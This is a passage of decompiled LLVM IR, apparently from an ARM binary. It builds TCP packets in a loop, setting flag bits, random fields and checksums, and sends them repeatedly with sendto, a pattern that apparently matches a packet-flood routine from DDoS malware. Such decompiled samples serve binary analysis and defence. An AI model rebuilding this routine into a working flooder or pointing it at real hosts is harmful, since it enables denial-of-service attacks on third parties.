  %v4_d354 = zext i8 %v3_d354 to i32
  %v4_d358 = mul nuw nsw i32 %v4_d350, 256
  %v5_d358 = or i32 %v4_d354, %v4_d358
  store i32 %v5_d358, i32* %r3.global-to-local, align 4
  %v2_d35c = load i32, i32* @r4, align 4
  %v3_d35c = add i32 %v2_d35c, 20
  %v4_d35c = inttoptr i32 %v3_d35c to i8*
  store i8 %v3_d354, i8* %v4_d35c, align 1
  %v0_d360 = load i32, i32* @r4, align 4
  %v1_d360 = add i32 %v0_d360, 20
  store i32 %v1_d360, i32* @r6, align 4
  %v0_d364 = load i32, i32* %r3.global-to-local, align 4
  %v3_d364 = sdiv i32 %v0_d364, 256
  store i32 %v3_d364, i32* %r3.global-to-local, align 4
  %v1_d368 = trunc i32 %v3_d364 to i8
  %v3_d368 = add i32 %v0_d360, 21
  %v4_d368 = inttoptr i32 %v3_d368 to i8*
  store i8 %v1_d368, i8* %v4_d368, align 1
  %v0_d36c = load i32, i32* @r6, align 4
  %v1_d36c = add i32 %v0_d36c, 13
  %v2_d36c = inttoptr i32 %v1_d36c to i8*
  %v3_d36c = load i8, i8* %v2_d36c, align 1
  %v4_d36c = zext i8 %v3_d36c to i32
  store i32 %v4_d36c, i32* %r3.global-to-local, align 4
  %v0_d370 = load i32, i32* %r2.global-to-local, align 4
  %v1_d370 = add i32 %v0_d370, 8
  %v2_d370 = inttoptr i32 %v1_d370 to i32*
  %v3_d370 = load i32, i32* %v2_d370, align 4
  store i32 %v3_d370, i32* %r1.global-to-local, align 4
  %v1_d374 = or i32 %v4_d36c, 1
  store i32 %v1_d374, i32* %r3.global-to-local, align 4
  %v1_d378 = add i32 %v0_d370, 15
  %v2_d378 = inttoptr i32 %v1_d378 to i8*
  %v3_d378 = load i8, i8* %v2_d378, align 1
  %v4_d378 = zext i8 %v3_d378 to i32
  store i32 %v4_d378, i32* %ip.global-to-local, align 4
  %v1_d37c = add i32 %v0_d370, 14
  %v2_d37c = inttoptr i32 %v1_d37c to i8*
  %v3_d37c = load i8, i8* %v2_d37c, align 1
  %v4_d37c = zext i8 %v3_d37c to i32
  store i32 %v4_d37c, i32* %r0.global-to-local, align 4
  %v2_d380 = add i32 %v0_d36c, 4
  %v3_d380 = inttoptr i32 %v2_d380 to i32*
  store i32 %v3_d370, i32* %v3_d380, align 4
  %v0_d384 = load i32, i32* %r2.global-to-local, align 4
  %v1_d384 = add i32 %v0_d384, 4
  %v2_d384 = inttoptr i32 %v1_d384 to i32*
  %v3_d384 = load i32, i32* %v2_d384, align 4
  store i32 %v3_d384, i32* %lr.global-to-local, align 4
  %v0_d388 = load i32, i32* %r3.global-to-local, align 4
  %v1_d388 = trunc i32 %v0_d388 to i8
  %v2_d388 = load i32, i32* @r6, align 4
  %v3_d388 = add i32 %v2_d388, 13
  %v4_d388 = inttoptr i32 %v3_d388 to i8*
  store i8 %v1_d388, i8* %v4_d388, align 1
  %v0_d38c = load i32, i32* @r6, align 4
  %v1_d38c = add i32 %v0_d38c, 12
  %v2_d38c = inttoptr i32 %v1_d38c to i8*
  %v3_d38c = load i8, i8* %v2_d38c, align 1
  %v4_d38c = zext i8 %v3_d38c to i32
  store i32 %v4_d38c, i32* %r2.global-to-local, align 4
  %v1_d390 = add i32 %v0_d38c, 13
  %v2_d390 = inttoptr i32 %v1_d390 to i8*
  %v3_d390 = load i8, i8* %v2_d390, align 1
  %v4_d390 = zext i8 %v3_d390 to i32
  %v0_d394 = load i32, i32* %r0.global-to-local, align 4
  %v1_d394 = load i32, i32* %ip.global-to-local, align 4
  %v4_d394 = mul i32 %v1_d394, 256
  %v5_d394 = or i32 %v4_d394, %v0_d394
  store i32 %v5_d394, i32* %r0.global-to-local, align 4
  %tmp114 = urem i8 %v3_d38c, 16
  %v1_d398 = zext i8 %tmp114 to i32
  %v3_d39c = sdiv i32 %v5_d394, 256
  store i32 %v3_d39c, i32* %r1.global-to-local, align 4
  %v1_d3a0 = or i32 %v1_d398, 128
  store i32 %v1_d3a0, i32* %r2.global-to-local, align 4
  %v1_d3a4 = or i32 %v4_d390, 16
  store i32 %v1_d3a4, i32* %r3.global-to-local, align 4
  %v1_d3a8 = trunc i32 %v3_d39c to i8
  %v3_d3a8 = add i32 %v0_d38c, 3
  %v4_d3a8 = inttoptr i32 %v3_d3a8 to i8*
  store i8 %v1_d3a8, i8* %v4_d3a8, align 1
  %v0_d3ac = load i32, i32* %r2.global-to-local, align 4
  %v1_d3ac = trunc i32 %v0_d3ac to i8
  %v2_d3ac = load i32, i32* @r6, align 4
  %v3_d3ac = add i32 %v2_d3ac, 12
  %v4_d3ac = inttoptr i32 %v3_d3ac to i8*
  store i8 %v1_d3ac, i8* %v4_d3ac, align 1
  %v0_d3b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_d3b0 = trunc i32 %v0_d3b0 to i8
  %v2_d3b0 = load i32, i32* @r6, align 4
  %v3_d3b0 = add i32 %v2_d3b0, 13
  %v4_d3b0 = inttoptr i32 %v3_d3b0 to i8*
  store i8 %v1_d3b0, i8* %v4_d3b0, align 1
  %v0_d3b4 = load i32, i32* %lr.global-to-local, align 4
  %v1_d3b4 = load i32, i32* @r6, align 4
  %v2_d3b4 = add i32 %v1_d3b4, 8
  %v3_d3b4 = inttoptr i32 %v2_d3b4 to i32*
  store i32 %v0_d3b4, i32* %v3_d3b4, align 4
  %v0_d3b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_d3b8 = trunc i32 %v0_d3b8 to i8
  %v2_d3b8 = load i32, i32* @r6, align 4
  %v3_d3b8 = add i32 %v2_d3b8, 2
  %v4_d3b8 = inttoptr i32 %v3_d3b8 to i8*
  store i8 %v1_d3b8, i8* %v4_d3b8, align 1
  %v0_d3bc = call i32 @function_117dc()
  %v1_d3bc = trunc i32 %v0_d3bc to i8
  store i32 %v0_d3bc, i32* %r0.global-to-local, align 4
  store i32 %v1_ce84, i32* %r1.global-to-local, align 4
  %v0_d3c4 = load i32, i32* @r6, align 4
  %v1_d3c4 = add i32 %v0_d3c4, 13
  %v2_d3c4 = inttoptr i32 %v1_d3c4 to i8*
  %v3_d3c4 = load i8, i8* %v2_d3c4, align 1
  %v4_d3c4 = zext i8 %v3_d3c4 to i32
  store i32 %v1_d3c8, i32* %r2.global-to-local, align 4
  %v1_d3cc = and i32 %v4_d3c4, 223
  %v5_d3d0 = or i32 %v1_d3cc, %v4_d3d0
  store i32 %v5_d3d0, i32* %r3.global-to-local, align 4
  %v1_d3d4 = trunc i32 %v5_d3d0 to i8
  store i8 %v1_d3d4, i8* %v2_d3c4, align 1
  store i32 %v1_cea4, i32* %ip.global-to-local, align 4
  %v0_d3dc = load i32, i32* @r6, align 4
  %v1_d3dc = add i32 %v0_d3dc, 13
  %v2_d3dc = inttoptr i32 %v1_d3dc to i8*
  %v3_d3dc = load i8, i8* %v2_d3dc, align 1
  %v4_d3dc = zext i8 %v3_d3dc to i32
  store i32 %v1_d3e0, i32* %r3.global-to-local, align 4
  %v1_d3e4 = and i32 %v4_d3dc, 239
  %v5_d3e8 = or i32 %v1_d3e4, %v4_d3e8
  store i32 %v5_d3e8, i32* %r2.global-to-local, align 4
  %v1_d3ec = trunc i32 %v5_d3e8 to i8
  store i8 %v1_d3ec, i8* %v2_d3dc, align 1
  store i32 %v1_cec4, i32* %r1.global-to-local, align 4
  %v0_d3f4 = load i32, i32* @r6, align 4
  %v1_d3f4 = add i32 %v0_d3f4, 13
  %v2_d3f4 = inttoptr i32 %v1_d3f4 to i8*
  %v3_d3f4 = load i8, i8* %v2_d3f4, align 1
  %v4_d3f4 = zext i8 %v3_d3f4 to i32
  store i32 %v1_d3f8, i32* %r2.global-to-local, align 4
  %v1_d3fc = and i32 %v4_d3f4, 247
  %v5_d400 = or i32 %v1_d3fc, %v4_d400
  store i32 %v5_d400, i32* %r3.global-to-local, align 4
  %v1_d404 = trunc i32 %v5_d400 to i8
  store i8 %v1_d404, i8* %v2_d3f4, align 1
  store i32 %v1_cee4, i32* %ip.global-to-local, align 4
  %v0_d40c = load i32, i32* @r6, align 4
  %v1_d40c = add i32 %v0_d40c, 13
  %v2_d40c = inttoptr i32 %v1_d40c to i8*
  %v3_d40c = load i8, i8* %v2_d40c, align 1
  %v4_d40c = zext i8 %v3_d40c to i32
  store i32 %v1_d410, i32* %r3.global-to-local, align 4
  %v1_d414 = and i32 %v4_d40c, 251
  %v5_d418 = or i32 %v1_d414, %v4_d418
  store i32 %v5_d418, i32* %r2.global-to-local, align 4
  %v1_d41c = trunc i32 %v5_d418 to i8
  store i8 %v1_d41c, i8* %v2_d40c, align 1
  store i32 %v1_cf04, i32* %r1.global-to-local, align 4
  %v0_d424 = load i32, i32* @r6, align 4
  %v1_d424 = add i32 %v0_d424, 13
  %v2_d424 = inttoptr i32 %v1_d424 to i8*
  %v3_d424 = load i8, i8* %v2_d424, align 1
  %v4_d424 = zext i8 %v3_d424 to i32
  store i32 %v1_d428, i32* %r2.global-to-local, align 4
  %v1_d42c = and i32 %v4_d424, 253
  %v4_d430 = or i32 %v1_d42c, %v3_d430
  store i32 %v4_d430, i32* %r3.global-to-local, align 4
  %v1_d434 = trunc i32 %v4_d430 to i8
  store i8 %v1_d434, i8* %v2_d424, align 1
  %v0_d438 = load i32, i32* @r6, align 4
  %v1_d438 = add i32 %v0_d438, 13
  %v2_d438 = inttoptr i32 %v1_d438 to i8*
  %v3_d438 = load i8, i8* %v2_d438, align 1
  %v4_d438 = zext i8 %v3_d438 to i32
  %v0_d43c = load i32, i32* @r8, align 4
  %v1_d43c = urem i32 %v0_d43c, 2
  %v1_d440 = and i32 %v4_d438, 254
  store i32 %v1_d440, i32* %r2.global-to-local, align 4
  %v4_d44436 = udiv i32 %v0_d3bc, 256
  %v2_d448 = or i32 %v1_d440, %v1_d43c
  store i32 %v2_d448, i32* %r3.global-to-local, align 4
  %v1_d44c = trunc i32 %v4_d44436 to i8
  %v3_d44c = add i32 %v0_d438, 15
  %v4_d44c = inttoptr i32 %v3_d44c to i8*
  store i8 %v1_d44c, i8* %v4_d44c, align 1
  %v3_d450 = load i32, i32* @r6, align 4
  %v4_d450 = add i32 %v3_d450, 14
  %v5_d450 = inttoptr i32 %v4_d450 to i8*
  store i8 %v1_d3bc, i8* %v5_d450, align 1
  %v0_d454 = load i32, i32* %r3.global-to-local, align 4
  %v1_d454 = trunc i32 %v0_d454 to i8
  %v2_d454 = load i32, i32* @r6, align 4
  %v3_d454 = add i32 %v2_d454, 13
  %v4_d454 = inttoptr i32 %v3_d454 to i8*
  store i8 %v1_d454, i8* %v4_d454, align 1
  %v0_d458 = load i32, i32* @r4, align 4
  %v1_d458 = add i32 %v0_d458, 40
  store i32 %v1_d458, i32* %r0.global-to-local, align 4
  %v0_d45c = load i32, i32* @sb, align 4
  store i32 %v0_d45c, i32* @r1, align 4
  %v1_d460 = inttoptr i32 %v1_d458 to i8*
  %v2_d460 = call i32 @function_119b8(i8* %v1_d460)
  store i32 %v2_d460, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d464

dec_label_pc_d464:                                ; preds = %dec_label_pc_cff4, %bb94
  %v3_d464 = load i32, i32* %stack_var_-40, align 4
  %v1_d468 = add i32 %v3_d464, 1
  store i32 %v1_d468, i32* %r3.global-to-local, align 4
  %v1_d46c = load i32, i32* @fp, align 4
  %v9_d46c = icmp eq i32 %v1_d468, %v1_d46c
  store i1 %v9_d46c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d468, i32* %stack_var_-40, align 4
  %v5_d474 = icmp slt i32 %v1_d468, %v1_d46c
  br i1 %v5_d474, label %dec_label_pc_cfd8, label %dec_label_pc_d478

dec_label_pc_d478:                                ; preds = %dec_label_pc_d464, %.thread26
  %v0_d48020 = phi i32 [ %v0_cfac, %.thread26 ], [ %v1_d46c, %dec_label_pc_d464 ]
  %v0_d478 = load i32, i32* @sb, align 4
  %v1_d478 = add i32 %v0_d478, 40
  store i32 %v1_d478, i32* @sl, align 4
  %v1_d47c = add i32 %v0_d478, 20
  store i32 %v1_d47c, i32* @r7, align 4
  %v2_d5f8 = icmp eq i32 %v1_cf5c, 0
  %v6_d4ac = inttoptr i32 %v2_cdcc to i32*
  %v3_d4b4 = icmp eq i32 %v3_cfb4, 65535
  br label %dec_label_pc_d480

dec_label_pc_d480:                                ; preds = %dec_label_pc_d4dc, %dec_label_pc_d478
  %v0_d480 = phi i32 [ %v1_d5bc, %dec_label_pc_d4dc ], [ %v0_d48020, %dec_label_pc_d478 ]
  %v2_d480 = icmp eq i32 %v0_d480, 0
  store i1 %v2_d480, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp95 = icmp slt i32 %v0_d480, 1
  br label %dec_label_pc_d488

dec_label_pc_d488:                                ; preds = %dec_label_pc_d488, %dec_label_pc_d480
  br i1 %tmp95, label %dec_label_pc_d488, label %dec_label_pc_d48c

dec_label_pc_d48c:                                ; preds = %dec_label_pc_d488
  %v0_d48c = load i32, i32* @r7, align 4
  %tmp96 = mul i32 %v0_d48c, 256
  %v1_d494 = and i32 %tmp96, 65280
  %tmp97 = udiv i32 %v0_d48c, 256
  %v4_d498 = urem i32 %tmp97, 256
  %v5_d498 = or i32 %v4_d498, %v1_d494
  store i32 %v5_d498, i32* @r8, align 4
  store i32 %v2_cdcc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_cfb4, i32* %ip.global-to-local, align 4
  %v7_d4ac = load i32, i32* %v6_d4ac, align 4
  store i32 %v7_d4ac, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_d4b4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* @r6, align 4
  %v1_d4c0 = add i32 %v7_d4ac, 20
  store i32 %v1_d4c0, i32* @r5, align 4
  br i1 %v3_d4b4, label %dec_label_pc_d5e8, label %dec_label_pc_d4c8

dec_label_pc_d4c8:                                ; preds = %dec_label_pc_d5c8, %dec_label_pc_d48c
  %v0_d4d4 = phi i32 [ %v7_d5d4, %dec_label_pc_d5c8 ], [ %v7_d4ac, %dec_label_pc_d48c ]
  store i1 %v2_d5f8, i1* %cpsr_z.global-to-local, align 1
  %v0_d4d0 = load i32, i32* @sb, align 4
  store i32 %v0_d4d0, i32* @r1, align 4
  %v1_d4d4 = add i32 %v0_d4d4, 40
  store i32 %v1_d4d4, i32* %r0.global-to-local, align 4
  br i1 %v2_d5f8, label %dec_label_pc_d4dc, label %dec_label_pc_d60c

dec_label_pc_d4dc:                                ; preds = %dec_label_pc_d4c8, %dec_label_pc_d5e8, %dec_label_pc_d60c
  %v2_d4dc = phi i32 [ %v0_d4d4, %dec_label_pc_d4c8 ], [ %v0_d600, %dec_label_pc_d5e8 ], [ %v2_d4dc.pre, %dec_label_pc_d60c ]
  %v0_d4dc = load i32, i32* @r6, align 4
  %v1_d4dc = trunc i32 %v0_d4dc to i8
  %v3_d4dc = add i32 %v2_d4dc, 10
  %v4_d4dc = inttoptr i32 %v3_d4dc to i8*
  store i8 %v1_d4dc, i8* %v4_d4dc, align 1
  %v0_d4e0 = load i32, i32* @r6, align 4
  %v1_d4e0 = trunc i32 %v0_d4e0 to i8
  %v2_d4e0 = load i32, i32* @r4, align 4
  %v3_d4e0 = add i32 %v2_d4e0, 11
  %v4_d4e0 = inttoptr i32 %v3_d4e0 to i8*
  store i8 %v1_d4e0, i8* %v4_d4e0, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_d4e8 = load i32, i32* @r4, align 4
  store i32 %v0_d4e8, i32* @r0, align 4
  %v2_d4ec = call i32 @function_fda0(i32 %v0_d4e8, i32 20)
  %v3_d4ec = trunc i32 %v2_d4ec to i8
  store i32 %v2_d4ec, i32* %r0.global-to-local, align 4
  %v3_d4f0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_cdbc, i32* %r2.global-to-local, align 4
  %v3_d4f8 = mul i32 %v3_d4f0, 16
  %v2_d4fc = add i32 %v3_d4f8, %v2_cdbc
  store i32 %v2_d4fc, i32* %r1.global-to-local, align 4
  %v1_d500 = add i32 %v2_d4fc, 4
  %v2_d500 = inttoptr i32 %v1_d500 to i32*
  %v3_d500 = load i32, i32* %v2_d500, align 4
  %v3_d504 = mul i32 %v3_d500, 65536
  store i32 %v3_d504, i32* %ip.global-to-local, align 4
  %tmp98 = mul i32 %v3_d500, 256
  %v1_d50c = and i32 %tmp98, 65280
  %tmp99 = udiv i32 %v3_d500, 256
  %v4_d510 = urem i32 %tmp99, 256
  %v5_d510 = or i32 %v4_d510, %v1_d50c
  store i32 %v5_d510, i32* %r2.global-to-local, align 4
  %v1_d514 = add i32 %v3_d500, 1
  store i32 %v1_d514, i32* %r3.global-to-local, align 4
  store i32 %v1_d514, i32* %v2_d500, align 4
  %v0_d51c = load i32, i32* %r2.global-to-local, align 4
  %v1_d51c = load i32, i32* @r5, align 4
  %v2_d51c = add i32 %v1_d51c, 4
  %v3_d51c = inttoptr i32 %v2_d51c to i32*
  store i32 %v0_d51c, i32* %v3_d51c, align 4
  %v0_d520 = load i32, i32* %r1.global-to-local, align 4
  %v1_d520 = add i32 %v0_d520, 8
  %v2_d520 = inttoptr i32 %v1_d520 to i32*
  %v3_d520 = load i32, i32* %v2_d520, align 4
  %tmp100 = mul i32 %v3_d520, 256
  %v1_d52c = and i32 %tmp100, 65280
  %tmp101 = udiv i32 %v3_d520, 256
  %v4_d530 = urem i32 %tmp101, 256
  %v5_d530 = or i32 %v4_d530, %v1_d52c
  store i32 %v5_d530, i32* %r2.global-to-local, align 4
  %v4_d53437 = udiv i32 %v2_d4ec, 256
  %v1_d538 = trunc i32 %v4_d53437 to i8
  %v2_d538 = load i32, i32* @r4, align 4
  %v3_d538 = add i32 %v2_d538, 11
  %v4_d538 = inttoptr i32 %v3_d538 to i8*
  store i8 %v1_d538, i8* %v4_d538, align 1
  %v3_d53c = load i32, i32* @r4, align 4
  %v4_d53c = add i32 %v3_d53c, 10
  %v5_d53c = inttoptr i32 %v4_d53c to i8*
  store i8 %v3_d4ec, i8* %v5_d53c, align 1
  %v0_d540 = load i32, i32* %r2.global-to-local, align 4
  %v1_d540 = load i32, i32* @r5, align 4
  %v2_d540 = add i32 %v1_d540, 8
  %v3_d540 = inttoptr i32 %v2_d540 to i32*
  store i32 %v0_d540, i32* %v3_d540, align 4
  %v0_d544 = load i32, i32* @r5, align 4
  store i32 %v0_d544, i32* @r1, align 4
  %v0_d548 = load i32, i32* @r8, align 4
  store i32 %v0_d548, i32* %r2.global-to-local, align 4
  %v0_d54c = load i32, i32* @r7, align 4
  store i32 %v0_d54c, i32* %r3.global-to-local, align 4
  %v0_d550 = load i32, i32* @r4, align 4
  store i32 %v0_d550, i32* %r0.global-to-local, align 4
  %v0_d554 = load i32, i32* @r6, align 4
  %v1_d554 = trunc i32 %v0_d554 to i8
  %v3_d554 = add i32 %v0_d544, 16
  %v4_d554 = inttoptr i32 %v3_d554 to i8*
  store i8 %v1_d554, i8* %v4_d554, align 1
  %v0_d558 = load i32, i32* @r6, align 4
  %v1_d558 = trunc i32 %v0_d558 to i8
  %v2_d558 = load i32, i32* @r5, align 4
  %v3_d558 = add i32 %v2_d558, 17
  %v4_d558 = inttoptr i32 %v3_d558 to i8*
  store i8 %v1_d558, i8* %v4_d558, align 1
  %v4_d55c = call i32 @function_fdfc(i32 %v0_d550, i32 %v0_d544, i32 %v0_d548, i32 %v0_d54c)
  %v5_d55c = trunc i32 %v4_d55c to i8
  store i32 %v4_d55c, i32* %r0.global-to-local, align 4
  %v4_d56038 = udiv i32 %v4_d55c, 256
  %v1_d564 = trunc i32 %v4_d56038 to i8
  %v2_d564 = load i32, i32* @r5, align 4
  %v3_d564 = add i32 %v2_d564, 17
  %v4_d564 = inttoptr i32 %v3_d564 to i8*
  store i8 %v1_d564, i8* %v4_d564, align 1
  %v3_d568 = load i32, i32* @r5, align 4
  %v4_d568 = add i32 %v3_d568, 16
  %v5_d568 = inttoptr i32 %v4_d568 to i8*
  store i8 %v5_d55c, i8* %v5_d568, align 1
  %v3_d56c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d56c, i32* %r3.global-to-local, align 4
  %v0_d570 = load i32, i32* @r4, align 4
  %v1_d570 = add i32 %v0_d570, 20
  %v2_d570 = inttoptr i32 %v1_d570 to i32*
  %v3_d570 = load i32, i32* %v2_d570, align 4
  %v5_d578 = mul i32 %v3_d56c, 24
  %v3_d580 = udiv i32 %v3_d570, 65536
  store i32 %v3_d580, i32* %r2.global-to-local, align 4
  %v2_d584 = add i32 %v5_d578, %arg2
  store i32 %v2_d584, i32* %ip.global-to-local, align 4
  %v3_d5886 = udiv i32 %v3_d570, 16777216
  %v1_d58c = trunc i32 %v3_d5886 to i8
  %v3_d58c = add i32 %v2_d584, 3
  %v4_d58c = inttoptr i32 %v3_d58c to i8*
  store i8 %v1_d58c, i8* %v4_d58c, align 1
  %v0_d590 = load i32, i32* %r2.global-to-local, align 4
  %v1_d590 = trunc i32 %v0_d590 to i8
  %v2_d590 = load i32, i32* %ip.global-to-local, align 4
  %v3_d590 = add i32 %v2_d590, 2
  %v4_d590 = inttoptr i32 %v3_d590 to i8*
  store i8 %v1_d590, i8* %v4_d590, align 1
  %v0_d594 = load i32, i32* @r4, align 4
  store i32 %v0_d594, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_cf6c, i32* %r0.global-to-local, align 4
  %v0_d5a0 = load i32, i32* @sl, align 4
  store i32 %v0_d5a0, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_d5a8 = load i32, i32* %ip.global-to-local, align 4
  %v6_d5b0 = call i32 @_sendto(i32 %v3_cf6c, i32 %v0_d594, i32 %v0_d5a0, i32 16384, i32 %v0_d5a8, i32 16)
  %v3_d5b4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d5b4, i32* %r3.global-to-local, align 4
  %v1_d5b8 = add i32 %v3_d5b4, 1
  store i32 %v1_d5b8, i32* %r0.global-to-local, align 4
  %v1_d5bc = load i32, i32* @fp, align 4
  %v9_d5bc = icmp eq i32 %v1_d5b8, %v1_d5bc
  store i1 %v9_d5bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d5b8, i32* %stack_var_-40, align 4
  %v6_d5c4 = icmp slt i32 %v1_d5b8, %v1_d5bc
  br i1 %v6_d5c4, label %dec_label_pc_d5c8, label %dec_label_pc_d480

dec_label_pc_d5c8:                                ; preds = %dec_label_pc_d4dc
  store i32 %v2_cdcc, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_cfb4, i32* %ip.global-to-local, align 4
  %v4_d5d4 = mul i32 %v1_d5b8, 4
  %v5_d5d4 = add i32 %v4_d5d4, %v2_cdcc
  %v6_d5d4 = inttoptr i32 %v5_d5d4 to i32*
  %v7_d5d4 = load i32, i32* %v6_d5d4, align 4
  store i32 %v7_d5d4, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_d4b4, i1* %cpsr_z.global-to-local, align 1
  %v1_d5e0 = add i32 %v7_d5d4, 20
  store i32 %v1_d5e0, i32* @r5, align 4
  br i1 %v3_d4b4, label %dec_label_pc_d5e8, label %dec_label_pc_d4c8

dec_label_pc_d5e8:                                ; preds = %dec_label_pc_d5c8, %dec_label_pc_d48c
  %v0_d5e8 = call i32 @function_117dc()
  %v1_d5e8 = trunc i32 %v0_d5e8 to i8
  %v4_d5ec = sdiv i32 %v0_d5e8, 256
  store i32 %v4_d5ec, i32* %r3.global-to-local, align 4
  %v3_d5f0 = load i32, i32* @r4, align 4
  %v4_d5f0 = add i32 %v3_d5f0, 4
  %v5_d5f0 = inttoptr i32 %v4_d5f0 to i8*
  store i8 %v1_d5e8, i8* %v5_d5f0, align 1
  store i1 %v2_d5f8, i1* %cpsr_z.global-to-local, align 1
  %v0_d5fc = load i32, i32* %r3.global-to-local, align 4
  %v1_d5fc = trunc i32 %v0_d5fc to i8
  %v2_d5fc = load i32, i32* @r4, align 4
  %v3_d5fc = add i32 %v2_d5fc, 5
  %v4_d5fc = inttoptr i32 %v3_d5fc to i8*
  store i8 %v1_d5fc, i8* %v4_d5fc, align 1
  %v0_d600 = load i32, i32* @r4, align 4
  %v1_d600 = add i32 %v0_d600, 40
  store i32 %v1_d600, i32* %r0.global-to-local, align 4
  %v0_d604 = load i32, i32* @sb, align 4
  store i32 %v0_d604, i32* @r1, align 4
  %v0_d608 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d608, label %dec_label_pc_d4dc, label %dec_label_pc_d60c

dec_label_pc_d60c:                                ; preds = %dec_label_pc_d4c8, %dec_label_pc_d5e8
  %v0_d60c = phi i32 [ %v1_d4d4, %dec_label_pc_d4c8 ], [ %v1_d600, %dec_label_pc_d5e8 ]
  %v1_d60c = inttoptr i32 %v0_d60c to i8*
  %v2_d60c = call i32 @function_119b8(i8* %v1_d60c)
  store i32 %v2_d60c, i32* %r0.global-to-local, align 4
  %v2_d4dc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d4dc

; uselistorder directives
  uselistorder i32 %v0_d600, { 1, 0 }
  uselistorder i32 %v7_d5d4, { 1, 2, 0 }
  uselistorder i32 %v1_d5bc, { 1, 2, 0 }
  uselistorder i32 %v1_d5b8, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_d55c, { 0, 2, 1 }
  uselistorder i32 %v0_d544, { 1, 0, 2 }
  uselistorder i32 %v3_d520, { 1, 0 }
  uselistorder i32 %v3_d500, { 3, 2, 0, 1 }
  uselistorder i32 %v2_d4ec, { 0, 2, 1 }
  uselistorder i32 %v0_d4d4, { 1, 0 }
  uselistorder i32 %v0_d48c, { 1, 0 }
  uselistorder i32 %v0_d480, { 1, 0 }
  uselistorder i1 %v3_d4b4, { 2, 3, 1, 0 }
  uselistorder i1 %v2_d5f8, { 2, 1, 0 }
  uselistorder i32 %v1_d468, { 1, 0, 2, 3 }
  uselistorder i32 %v0_d3bc, { 0, 2, 1 }
  uselistorder i32 %v3_d39c, { 1, 0 }
  uselistorder i32 %v0_d370, { 1, 0, 2 }
  uselistorder i32 %v3_d364, { 1, 0 }
  uselistorder i32 %v1_d2c8, { 1, 0 }
  uselistorder i32 %v0_d2bc, { 1, 2, 0 }
  uselistorder i32 %v3_d280, { 1, 0 }
  uselistorder i32 %v2_d26c, { 1, 0 }
  uselistorder i32 %v3_d250, { 1, 0, 2, 3 }
  uselistorder i32 %v2_d248, { 1, 0 }
  uselistorder i32 %v3_d224, { 1, 0, 2 }
  uselistorder i32 %v3_d21c, { 1, 0 }
  uselistorder i32 %v4_d204, { 1, 0 }
  uselistorder i32 %v0_d200, { 0, 2, 1 }
  uselistorder i1 %v7_d170, { 1, 0 }
  uselistorder i32 %v6_d168, { 0, 2, 1, 3 }
  uselistorder i32 %v5_d1b4, { 1, 0 }
  uselistorder i1 %v9_d198, { 1, 0 }
  uselistorder i32 %v4_d1ac, { 1, 0 }
  uselistorder i32 %v4_d1a8, { 1, 0 }
  uselistorder i32 %storemerge34, { 0, 2, 1 }
  uselistorder i32 %v8_d0a0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_d08c, { 1, 0 }
  uselistorder i32 %v7_d058, { 4, 1, 3, 0, 2, 5 }
  uselistorder i1 %v7_d004, { 1, 0 }
  uselistorder i32 %v3_d000, { 2, 1, 0, 3 }
  uselistorder i32 %v1_d428, { 1, 0 }
  uselistorder i32 %v1_d410, { 1, 0 }
  uselistorder i32 %v1_d3f8, { 1, 0 }
  uselistorder i32 %v1_d3e0, { 1, 0 }
  uselistorder i32 %v1_d3c8, { 1, 0 }
  uselistorder i32 %v5_d1b0, { 1, 0 }
  uselistorder i32 %v3_d0e8106, { 1, 0 }
  uselistorder i1 %v2_d1c8, { 1, 0 }
  uselistorder i32 %v1_d1c4, { 1, 0 }
  uselistorder i32 %v4_d1c0, { 2, 0, 1 }
  uselistorder i32 %v4_d1a4, { 1, 0 }
  uselistorder i1 %v3_d0d0, { 1, 0 }
  uselistorder i32 %v1_cfe4, { 2, 1, 0 }
  uselistorder i32 %v8_cfc0, { 2, 1, 0 }
  uselistorder i32 %v8_cfbc, { 1, 2, 0 }
  uselistorder i32 %v3_cfb4, { 1, 2, 3, 0 }
  uselistorder i32 %v0_cfb0, { 1, 0, 3, 2 }
  uselistorder i1 %v7_cfa4, { 1, 0 }
  uselistorder i1 %v7_cf74, { 1, 0 }
  uselistorder i32 %v3_cf70, { 2, 3, 0, 1 }
  uselistorder i32 %v3_cf6c, { 5, 6, 1, 3, 4, 7, 8, 2, 0, 9 }
  uselistorder i32 %v1_cf5c, { 1, 0 }
  uselistorder i32 %v1_cf04, { 1, 0 }
  uselistorder i32 %v1_cee4, { 1, 0 }
  uselistorder i32 %v1_cec4, { 1, 0 }
  uselistorder i32 %v1_cea4, { 1, 0 }
  uselistorder i32 %v1_ce84, { 1, 0 }
  uselistorder i32 %v1_ce4c, { 1, 0 }
  uselistorder i32 %v2_cdcc, { 0, 4, 5, 2, 1, 3 }
  uselistorder i32 %v2_cdbc, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32 %v1_cda0, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 15, 14 }
